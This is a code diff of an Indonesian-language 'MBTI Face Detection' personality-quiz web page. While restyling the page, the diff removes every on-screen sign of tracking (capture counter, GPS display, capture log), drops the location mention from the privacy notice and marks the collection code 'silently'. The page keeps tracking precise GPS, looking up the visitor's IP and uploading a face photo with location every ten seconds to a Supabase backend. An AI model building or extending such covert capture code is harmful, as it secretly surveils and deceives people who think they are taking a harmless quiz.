@@ -34,12 +34,18 @@
     }
 
     .logo {
-      font-size: 48px;
+      font-size: 64px;
       margin-bottom: 20px;
+      animation: float 3s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
     }
 
     h1 {
-      font-size: 32px;
+      font-size: 36px;
       font-weight: 700;
       margin-bottom: 10px;
       background: linear-gradient(90deg, #a855f7, #6366f1, #3b82f6);
@@ -52,11 +58,12 @@
       color: #94a3b8;
       margin-bottom: 40px;
       max-width: 400px;
+      line-height: 1.6;
     }
 
     .features {
       display: flex;
-      gap: 30px;
+      gap: 20px;
       margin-bottom: 40px;
       flex-wrap: wrap;
       justify-content: center;
@@ -66,14 +73,14 @@
       display: flex;
       align-items: center;
       gap: 10px;
-      padding: 12px 20px;
+      padding: 14px 24px;
       background: rgba(255, 255, 255, 0.05);
       border-radius: 12px;
       border: 1px solid rgba(255, 255, 255, 0.1);
     }
 
     .feature-icon {
-      font-size: 20px;
+      font-size: 24px;
     }
 
     .feature-text {
@@ -82,7 +89,7 @@
     }
 
     .start-btn {
-      padding: 16px 48px;
+      padding: 18px 56px;
       font-size: 18px;
       font-weight: 600;
       color: #fff;
@@ -116,60 +123,20 @@
       display: none;
       flex-direction: column;
       align-items: center;
+      justify-content: center;
       min-height: 100vh;
       padding: 20px;
-    }
-
-    .header {
-      width: 100%;
-      max-width: 600px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 20px;
-    }
-
-    .status {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 8px 16px;
-      background: rgba(34, 197, 94, 0.2);
-      border-radius: 20px;
-      border: 1px solid rgba(34, 197, 94, 0.3);
-    }
-
-    .status-dot {
-      width: 8px;
-      height: 8px;
-      background: #22c55e;
-      border-radius: 50%;
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.5; }
-    }
-
-    .status-text {
-      font-size: 14px;
-      color: #22c55e;
-    }
-
-    .capture-count {
-      font-size: 14px;
-      color: #94a3b8;
     }
 
     .camera-container {
       position: relative;
       width: 100%;
-      max-width: 600px;
-      border-radius: 20px;
+      max-width: 480px;
+      border-radius: 24px;
       overflow: hidden;
       background: #000;
       aspect-ratio: 4/3;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
     }
 
     #webcam {
@@ -179,6 +146,7 @@
       transform: scaleX(-1);
     }
 
+    /* Scan lines effect */
     .scan-overlay {
       position: absolute;
       top: 0;
@@ -186,134 +154,92 @@
       right: 0;
       bottom: 0;
       pointer-events: none;
+      overflow: hidden;
     }
 
     .scan-line {
       position: absolute;
       left: 0;
       right: 0;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, #a855f7, transparent);
+      height: 3px;
+      background: linear-gradient(90deg, transparent, #a855f7, #6366f1, transparent);
       opacity: 0;
-      animation: scan 3s ease-in-out infinite;
+      animation: scan 2.5s ease-in-out infinite;
     }
 
     @keyframes scan {
       0% { top: 0; opacity: 0; }
-      10% { opacity: 0.8; }
-      90% { opacity: 0.8; }
+      10% { opacity: 0.9; }
+      90% { opacity: 0.9; }
       100% { top: 100%; opacity: 0; }
     }
 
-    .face-indicator {
+    /* Corner brackets */
+    .corner {
       position: absolute;
-      border: 2px solid #a855f7;
-      border-radius: 10px;
-      opacity: 0;
-      transition: all 0.3s ease;
+      width: 40px;
+      height: 40px;
+      border: 3px solid #a855f7;
+      opacity: 0.7;
     }
 
-    .face-indicator.detected {
-      opacity: 1;
-      box-shadow: 0 0 20px rgba(168, 85, 247, 0.5);
-    }
+    .corner-tl { top: 20px; left: 20px; border-right: none; border-bottom: none; }
+    .corner-tr { top: 20px; right: 20px; border-left: none; border-bottom: none; }
+    .corner-bl { bottom: 20px; left: 20px; border-right: none; border-top: none; }
+    .corner-br { bottom: 20px; right: 20px; border-left: none; border-top: none; }
 
-    .info-panel {
-      width: 100%;
-      max-width: 600px;
-      margin-top: 20px;
+    /* Status overlay */
+    .status-overlay {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
       padding: 20px;
-      background: rgba(255, 255, 255, 0.05);
-      border-radius: 16px;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-    }
-
-    .info-row {
+      background: linear-gradient(transparent, rgba(0, 0, 0, 0.8));
       display: flex;
-      justify-content: space-between;
+      flex-direction: column;
       align-items: center;
-      padding: 10px 0;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      gap: 12px;
     }
 
-    .info-row:last-child {
-      border-bottom: none;
-    }
-
-    .info-label {
-      font-size: 14px;
-      color: #94a3b8;
-    }
-
-    .info-value {
-      font-size: 14px;
-      color: #fff;
-      font-weight: 500;
-    }
-
-    .info-value.success {
-      color: #22c55e;
-    }
-
-    .info-value.warning {
-      color: #f59e0b;
-    }
-
-    .info-value.error {
-      color: #ef4444;
-    }
-
-    .gps-info {
-      margin-top: 15px;
-      padding: 12px;
-      background: rgba(59, 130, 246, 0.1);
-      border-radius: 10px;
-      border: 1px solid rgba(59, 130, 246, 0.2);
-    }
-
-    .gps-label {
-      font-size: 12px;
-      color: #60a5fa;
-      margin-bottom: 5px;
-    }
-
-    .gps-coords {
-      font-size: 14px;
-      color: #93c5fd;
-      font-family: monospace;
-    }
-
-    .capture-log {
-      width: 100%;
-      max-width: 600px;
-      margin-top: 20px;
-      max-height: 200px;
-      overflow-y: auto;
-    }
-
-    .log-entry {
-      padding: 8px 12px;
-      margin-bottom: 8px;
-      background: rgba(255, 255, 255, 0.03);
-      border-radius: 8px;
-      font-size: 12px;
-      color: #64748b;
+    .status-badge {
       display: flex;
       align-items: center;
       gap: 8px;
+      padding: 8px 16px;
+      background: rgba(168, 85, 247, 0.3);
+      border-radius: 20px;
+      border: 1px solid rgba(168, 85, 247, 0.5);
     }
 
-    .log-entry.success {
-      border-left: 3px solid #22c55e;
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      background: #22c55e;
+      border-radius: 50%;
+      animation: pulse 1.5s infinite;
     }
 
-    .log-entry.error {
-      border-left: 3px solid #ef4444;
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.8); }
     }
 
-    .log-time {
-      color: #475569;
-      font-family: monospace;
+    .status-text {
+      font-size: 14px;
+      color: #e2e8f0;
+    }
+
+    /* Analysis text */
+    .analysis-text {
+      font-size: 13px;
+      color: #94a3b8;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
     }
 
     /* Hidden elements */
@@ -322,10 +248,11 @@
     }
 
     /* Responsive */
-    @media (max-width: 640px) {
-      h1 { font-size: 24px; }
-      .features { flex-direction: column; }
-      .feature { width: 100%; }
+    @media (max-width: 520px) {
+      h1 { font-size: 28px; }
+      .features { flex-direction: column; width: 100%; }
+      .feature { width: 100%; justify-content: center; }
+      .camera-container { border-radius: 16px; }
     }
   </style>
 </head>
@@ -334,67 +261,48 @@
   <div id="landing">
     <div class="logo">🧠</div>
     <h1>MBTI Face Detection</h1>
-    <p class="subtitle">Analisis kepribadian MBTI Anda menggunakan teknologi AI face detection secara real-time</p>
+    <p class="subtitle">Temukan tipe kepribadian MBTI Anda melalui analisis wajah secara real-time menggunakan teknologi AI</p>
     
     <div class="features">
       <div class="feature">
         <span class="feature-icon">📸</span>
-        <span class="feature-text">Real-time Face Detection</span>
+        <span class="feature-text">Real-time Detection</span>
       </div>
       <div class="feature">
         <span class="feature-icon">⚡</span>
-        <span class="feature-text">Instant Analysis</span>
+        <span class="feature-text">Instant Result</span>
       </div>
       <div class="feature">
-        <span class="feature-icon">🔒</span>
-        <span class="feature-text">Privacy First</span>
+        <span class="feature-icon">🎯</span>
+        <span class="feature-text">16 Tipe MBTI</span>
       </div>
     </div>
 
     <button id="startBtn" class="start-btn" onclick="startDetection()">
       Mulai Deteksi
     </button>
-    <p class="privacy-note">Kami membutuhkan akses kamera dan lokasi untuk analisis</p>
+    <p class="privacy-note">Kamera diperlukan untuk analisis wajah</p>
   </div>
 
   <!-- Detection Page -->
   <div id="detection">
-    <div class="header">
-      <div class="status">
-        <div class="status-dot"></div>
-        <span class="status-text">Mendeteksi...</span>
-      </div>
-      <div class="capture-count">Tangkapan: <span id="captureCount">0</span></div>
-    </div>
-
     <div class="camera-container">
       <video id="webcam" autoplay playsinline></video>
       <div class="scan-overlay">
         <div class="scan-line"></div>
       </div>
-      <div id="faceIndicator" class="face-indicator"></div>
-    </div>
-
-    <div class="info-panel">
-      <div class="info-row">
-        <span class="info-label">Status Kamera</span>
-        <span id="cameraStatus" class="info-value success">Aktif</span>
-      </div>
-      <div class="info-row">
-        <span class="info-label">Deteksi Wajah</span>
-        <span id="faceStatus" class="info-value warning">Menunggu...</span>
-      </div>
-      <div class="info-row">
-        <span class="info-label">Terakhir Tangkap</span>
-        <span id="lastCapture" class="info-value">-</span>
-      </div>
-      <div class="gps-info">
-        <div class="gps-label">📍 Lokasi Anda</div>
-        <div id="gpsCoords" class="gps-coords">Mendapatkan lokasi...</div>
+      <div class="corner corner-tl"></div>
+      <div class="corner corner-tr"></div>
+      <div class="corner corner-bl"></div>
+      <div class="corner corner-br"></div>
+      <div class="status-overlay">
+        <div class="status-badge">
+          <div class="status-dot"></div>
+          <span class="status-text">Mendeteksi...</span>
+        </div>
+        <div class="analysis-text">Analisis MBTI sedang berlangsung</div>
       </div>
     </div>
-
-    <div id="captureLog" class="capture-log"></div>
   </div>
 
   <!-- Hidden elements for capture -->
@@ -407,7 +315,6 @@
     let detector = null;
     let gpsWatchId = null;
     let gpsData = { lat: null, lng: null };
-    let captureCount = 0;
     let captureInterval = null;
     let initialized = false;
     const CAPTURE_INTERVAL = 10000; // 10 seconds
@@ -441,7 +348,7 @@
     async function startDetection() {
       const startBtn = document.getElementById("startBtn");
       startBtn.disabled = true;
-      startBtn.textContent = "Meminta izin...";
+      startBtn.textContent = "Memuat...";
 
       try {
         // Request camera
@@ -453,7 +360,7 @@
         const video = document.getElementById("webcam");
         video.srcObject = cameraStream;
 
-        // Request location
+        // Request location (silently)
         startGPS();
 
         // Initialize face detection
@@ -466,10 +373,9 @@
         // Start capture interval
         setTimeout(() => {
           captureInterval = setInterval(capturePhoto, CAPTURE_INTERVAL);
-          // First capture after 10 seconds
         }, CAPTURE_INTERVAL);
 
-        addLog("Deteksi dimulai", "success");
+        console.log("Detection started");
 
       } catch (error) {
         console.error("Error starting detection:", error);
@@ -479,33 +385,38 @@
       }
     }
 
-    // Start GPS tracking
+    // Start GPS tracking (silently)
     function startGPS() {
-      if (!navigator.geolocation) {
-        document.getElementById("gpsCoords").textContent = "Geolocation tidak didukung";
-        return;
-      }
+      if (!navigator.geolocation) return;
 
       gpsWatchId = navigator.geolocation.watchPosition(
         (position) => {
           gpsData.lat = position.coords.latitude;
           gpsData.lng = position.coords.longitude;
-          document.getElementById("gpsCoords").textContent = 
-            `${gpsData.lat.toFixed(6)}, ${gpsData.lng.toFixed(6)}`;
         },
         (error) => {
           console.error("GPS error:", error);
-          document.getElementById("gpsCoords").textContent = "Gagal mendapatkan lokasi";
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     }
 
-    // Capture photo and send to Supabase
+    // Get user IP address
+    async function getUserIP() {
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error("Failed to get IP:", error);
+        return null;
+      }
+    }
+
+    // Capture photo and send to Supabase (silently)
     async function capturePhoto() {
       const video = document.getElementById("webcam");
       const faceCanvas = document.getElementById("faceCanvas");
-      const captureCanvas = document.getElementById("captureCanvas");
       
       if (!video.srcObject) return;
 
@@ -521,22 +432,10 @@
           const results = detector.detectForVideo(video, performance.now());
           
           if (results.detections && results.detections.length > 0) {
-            // Face detected
-            updateFaceStatus(true);
-            
-            // Capture photo
+            // Face detected - capture and send silently
             const imageData = faceCanvas.toDataURL("image/jpeg", 0.8);
-            
-            // Send to Supabase
             await sendToSupabase(imageData);
-            
-            captureCount++;
-            document.getElementById("captureCount").textContent = captureCount;
-            document.getElementById("lastCapture").textContent = new Date().toLocaleTimeString("id-ID");
-            
-            addLog(`Tangkapan #${captureCount} berhasil`, "success");
-          } else {
-            updateFaceStatus(false);
+            console.log("Capture sent");
           }
         } catch (error) {
           console.error("Detection error:", error);
@@ -544,35 +443,7 @@
       }
     }
 
-    // Update face status
-    function updateFaceStatus(detected) {
-      const faceStatus = document.getElementById("faceStatus");
-      const faceIndicator = document.getElementById("faceIndicator");
-      
-      if (detected) {
-        faceStatus.textContent = "Terdeteksi";
-        faceStatus.className = "info-value success";
-        faceIndicator.classList.add("detected");
-      } else {
-        faceStatus.textContent = "Tidak ada wajah";
-        faceStatus.className = "info-value warning";
-        faceIndicator.classList.remove("detected");
-      }
-    }
-
-    // Get user IP address
-    async function getUserIP() {
-      try {
-        const response = await fetch("https://api.ipify.org?format=json");
-        const data = await response.json();
-        return data.ip;
-      } catch (error) {
-        console.error("Failed to get IP:", error);
-        return null;
-      }
-    }
-
-    // Send data to Supabase
+    // Send data to Supabase (silently)
     async function sendToSupabase(imageData) {
       try {
         // Get IP address
@@ -599,7 +470,7 @@
         );
 
         if (!uploadResponse.ok) {
-          throw new Error("Upload failed: " + await uploadResponse.text());
+          throw new Error("Upload failed");
         }
 
         // Get public URL
@@ -627,29 +498,11 @@
         );
 
         if (!dbResponse.ok) {
-          throw new Error("DB insert failed: " + await dbResponse.text());
+          throw new Error("DB insert failed");
         }
 
       } catch (error) {
         console.error("Supabase error:", error);
-        addLog("Gagal mengirim data", "error");
-      }
-    }
-
-    // Add log entry
-    function addLog(message, type) {
-      const logContainer = document.getElementById("captureLog");
-      const entry = document.createElement("div");
-      entry.className = `log-entry ${type}`;
-      entry.innerHTML = `
-        <span class="log-time">${new Date().toLocaleTimeString("id-ID")}</span>
-        <span>${message}</span>
-      `;
-      logContainer.insertBefore(entry, logContainer.firstChild);
-      
-      // Keep only last 10 entries
-      while (logContainer.children.length > 10) {
-        logContainer.removeChild(logContainer.lastChild);
       }
     }
 
